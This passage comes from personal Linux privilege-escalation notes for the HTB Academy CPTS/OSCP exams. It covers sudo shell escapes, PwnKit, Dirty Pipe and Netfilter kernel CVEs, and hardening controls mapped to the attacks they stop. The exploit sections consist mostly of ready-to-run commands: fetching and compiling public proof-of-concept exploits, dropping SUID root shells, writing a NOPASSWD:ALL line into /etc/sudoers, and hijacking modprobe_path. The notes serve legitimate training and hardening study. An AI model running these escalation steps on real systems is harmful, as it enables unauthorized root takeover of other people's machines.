| `zip` | `sudo zip /tmp/x /etc/hosts -T --unzip-command="sh -c /bin/bash"` |
| `env` | `sudo env /bin/bash` |
| `tee` | `echo "user ALL=(ALL) NOPASSWD:ALL" \| sudo tee /etc/sudoers` |

---

## Sec 24 — Polkit / PwnKit — CVE-2021-4034

### Overview

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **Impact** | Any local unprivileged user → root |
| **Requirement** | Local access only |
| **Present since** | 2009 (12 years in polkit) |
| **Patched** | polkit ≥ 0.120 |
| **Affected distros** | Ubuntu 18.04/20.04/21.10, Debian 10/11, CentOS 8, RHEL 7/8, Fedora 34/35 |

### Mechanism

`pkexec` is a SUID binary. When called with `argc=0`:
1. Reads one position past the end of `argv[]` into `envp[]`
2. Writes back to that memory location
3. Enables attacker-controlled environment variable injection
4. `GCONV_PATH` gets poisoned → `pkexec` (SUID root) loads attacker's malicious `.so`
5. Arbitrary code executes as root

### Check

```bash
Hackerpatel007_1@htb[/htb]$ pkexec --version           # < 0.120 = vulnerable
Hackerpatel007_1@htb[/htb]$ ls -la /usr/bin/pkexec     # must be SUID
```

### Exploit

```bash
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/arthepsy/CVE-2021-4034.git /tmp/pk
Hackerpatel007_1@htb[/htb]$ cd /tmp/pk && gcc cve-2021-4034-poc.c -o poc
Hackerpatel007_1@htb[/htb]$ ./poc
```

### Troubleshooting

```bash
# Error: GLIBC_2.34 not found → target has older glibc
Hackerpatel007_1@htb[/htb]$ ldd --version
Hackerpatel007_1@htb[/htb]$ gcc -static cve-2021-4034-poc.c -o poc_static && ./poc_static
```

---

## Sec 25 — Dirty Pipe — CVE-2022-0847

### Overview

| Field | Detail |
|---|---|
| **Severity** | High |
| **Impact** | Overwrite read-only root-owned files — no write permission required |
| **Requirement** | Read access to target file only |
| **Affected kernels** | 5.8 – 5.17.0 |
| **Patched** | 5.16.11, 5.15.25, 5.10.102 |

### Mechanism

Linux pipes use `pipe_buffer` structs. The `PIPE_BUF_FLAG_CAN_MERGE` flag causes writes to merge into existing page cache pages. A bug in `copy_page_to_iter_pipe()` leaves this flag **uninitialized** — it retains stale values. By filling/draining a pipe then using `splice()` to reference a target file's page cache, subsequent writes bypass all permission checks and land directly in the kernel page cache.

**Limitations:** Cannot overwrite byte at offset `0` | Payload ≤ 4096 bytes | Cannot grow files | Target must be readable

### Check

```bash
Hackerpatel007_1@htb[/htb]$ uname -r     # 5.8.x – 5.17.0 = investigate further
```

### Exploit

```bash
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits /tmp/dp
Hackerpatel007_1@htb[/htb]$ cd /tmp/dp && bash compile.sh
```

**Variant 1** — Overwrites `/etc/passwd`. Noisy — leaves a modified system file.
```bash
Hackerpatel007_1@htb[/htb]$ ./exploit-1
```

**Variant 2 (Preferred)** — Hijacks a SUID binary momentarily, drops SUID shell at `/tmp/sh`. Clean.
```bash
Hackerpatel007_1@htb[/htb]$ ./exploit-2 /usr/bin/sudo
Hackerpatel007_1@htb[/htb]$ /tmp/sh -p

# Cleanup
Hackerpatel007_1@htb[/htb]$ rm /tmp/sh
```

---

## Sec 26 — Netfilter CVEs

**Why this works:** On Ubuntu and many distros, `kernel.unprivileged_userns_clone=1` by default — unprivileged users can create network namespaces and load Netfilter rules, triggering kernel memory corruption.

### Pre-check — Required Before Any Netfilter Exploit

```bash
Hackerpatel007_1@htb[/htb]$ cat /proc/sys/kernel/unprivileged_userns_clone
# Must be 1 — if 0, all Netfilter CVEs are blocked
```

### CVE Reference Table

| CVE | Kernel Range | Type | Risk | Notes |
|---|---|---|---|---|
| CVE-2021-22555 | 2.6 – 5.11 | Heap OOB write (x_tables) | Low | Compile with `-m32 -static` |
| CVE-2022-1015 | 5.15 – 5.16.24 | Stack OOB (nftables) | Low-Med | Requires nftables |
| CVE-2023-32233 | Up to 6.3.1 | UAF + modprobe_path | Medium | Requires libmnl + libnftnl |
| CVE-2022-25636 | 5.4 – 5.6.10 | Heap OOB (nf_dup_netdev) | **High** | Can kernel panic — use last |

### Priority Order

```
DirtyPipe → CVE-2021-22555 → CVE-2022-1015 → CVE-2023-32233 → CVE-2022-25636 (last resort)
```

### modprobe_path — CVE-2023-32233 Mechanism

`/proc/sys/kernel/modprobe` points to the binary called **as root** when an unknown file format is executed. CVE-2023-32233 overwrites this kernel variable to point to an attacker-controlled script.

```bash
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/Liuk3r/CVE-2023-32233.git /tmp/nft
Hackerpatel007_1@htb[/htb]$ cd /tmp/nft && make

Hackerpatel007_1@htb[/htb]$ cat > /tmp/modprobe << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
Hackerpatel007_1@htb[/htb]$ chmod +x /tmp/modprobe

Hackerpatel007_1@htb[/htb]$ ./exploit
Hackerpatel007_1@htb[/htb]$ /tmp/rootbash -p
```

---

## Sec 27 — Linux Hardening + Lynis

> Every missing control is an attack path. Every present control explains why your exploit failed.

### Hardening Controls Mapped to Attack Paths

| Missing Control | Attack It Enables |
|---|---|
| `unprivileged_userns_clone=1` | All Netfilter CVEs |
| polkit < 0.120 | PwnKit (CVE-2021-4034) |
| Kernel 5.8–5.17 unpatched | Dirty Pipe (CVE-2022-0847) |
| `env_keep+=LD_PRELOAD` in sudoers | LD_PRELOAD escalation |
| SUID binary with writable RUNPATH dir | Shared object hijacking |
| Writable Python `sys.path` entry | Python library hijacking |
| GTFOBins binary in sudoers | Sudo shell escape |
| Writable cron script | Cron job abuse |
| World-writable `/etc/passwd` | Root account injection |
| NFS `no_root_squash` | SUID binary creation on share |
| Exposed Docker socket | Docker group escalation |
| Accessible tmux/screen root session | Session hijacking |
| logrotate < 3.18.0 + writable log | logrotten exploit |
| Pod SA with cluster-admin rights | Kubernetes pod escape |

### Lynis — System Audit in Attacker Mode

```bash
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/CISOfy/lynis /tmp/lynis
Hackerpatel007_1@htb[/htb]$ cd /tmp/lynis && ./lynis audit system --pentest --quiet 2>/dev/null
```

| Symbol | Meaning | Attacker Action |
|---|---|---|
| `[!] Warning` | Active misconfiguration | Exploit now |
| `[*] Suggestion` | Potential misconfiguration | Investigate further |
| `[+] Passed` | Hardened | Skip this vector |

> Hardening index < 60 = poorly hardened box = many easy wins

### Critical sysctl Values

```bash
Hackerpatel007_1@htb[/htb]$ sysctl kernel.unprivileged_userns_clone   # 0 = Netfilter CVEs blocked
Hackerpatel007_1@htb[/htb]$ sysctl kernel.yama.ptrace_scope            # 1 = sudo token hijack blocked
Hackerpatel007_1@htb[/htb]$ sysctl kernel.kptr_restrict                # 2 = KASLR protected

# KASLR bypass check
Hackerpatel007_1@htb[/htb]$ cat /proc/kallsyms | head
# If addresses are visible (not all zeros) = KASLR bypassable
```

---

## Tools Reference

| Tool | Purpose | Command |
|---|---|---|
| **LinPEAS** | Automated system enumeration | `./linpeas.sh > /tmp/lp.out 2>&1` |
| **pspy** | Process monitoring without root | `./pspy64` |
| **Lynis** | System audit (attacker + defender) | `./lynis audit system --pentest --quiet` |
| **GTFOBins** | SUID / sudo / capability escapes | [gtfobins.github.io](https://gtfobins.github.io/) |
| **hashcat** | Offline hash cracking | `hashcat -m 1800 hash.txt rockyou.txt` |
| **arthepsy PoC** | CVE-2021-4034 PwnKit | `gcc -static poc.c -o poc && ./poc` |
| **AlexisAhmed PoC** | CVE-2022-0847 Dirty Pipe | `bash compile.sh && ./exploit-2 /usr/bin/sudo` |
| **logrotten** | Logrotate race condition | `./logrotten -p payload /var/log/file.log` |
| **lxd-alpine-builder** | LXD container escape | Build Alpine image for `lxc image import` |

---

## Key Takeaways

1. **Enumeration is the real skill.** Root access 90% of the time comes from thorough enumeration — the writable file, the cleartext credential, the NOPASSWD sudo entry. Kernel CVEs are the fallback.

2. **Always check sudo first.** `sudo -l` takes two seconds. Run it the moment you land a shell.

3. **Understand the mechanism, not just the command.** Knowing *why* PwnKit works (`argc=0` → OOB into `envp[]` → `GCONV_PATH` → SUID loads `.so`) means you can troubleshoot GLIBC mismatches, adapt on exam day, and write technically precise reports.

4. **Kernel CVEs require context.** Dirty Pipe is deterministic. PwnKit works on any polkit < 0.120. Netfilter requires user namespaces enabled. CVE-2022-25636 can kernel panic. Know which to use and in what order.

5. **GLIBC mismatches are a real-world problem.** Always compile exploits with `-static` when transferring to older targets. Check `ldd --version` on the target first.

6. **Hardening = enumeration reversed.** Every Lynis suggestion that wasn't implemented is an open door.

---

## References

- [GTFOBins](https://gtfobins.github.io/) — Unix binary privilege escalation
- [LinPEAS / PEASS-ng](https://github.com/peass-ng/PEASS-ng) — Automated Linux enumeration
- [pspy](https://github.com/DominicBreuker/pspy) — Process monitoring without root
- [PwnKit — Qualys Research](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
- [Dirty Pipe — Max Kellermann](https://dirtypipe.cm4all.com/)
- [CISOfy Lynis](https://github.com/CISOfy/lynis)
- [HTB Academy — Linux Privilege Escalation](https://academy.hackthebox.com/module/details/51)

---

*Personal notes — HTB Academy CPTS Pathway. Written for exam recall with full mechanics, failure cases, and realistic terminal output. Built for CPTS / OSCP exam day use.*
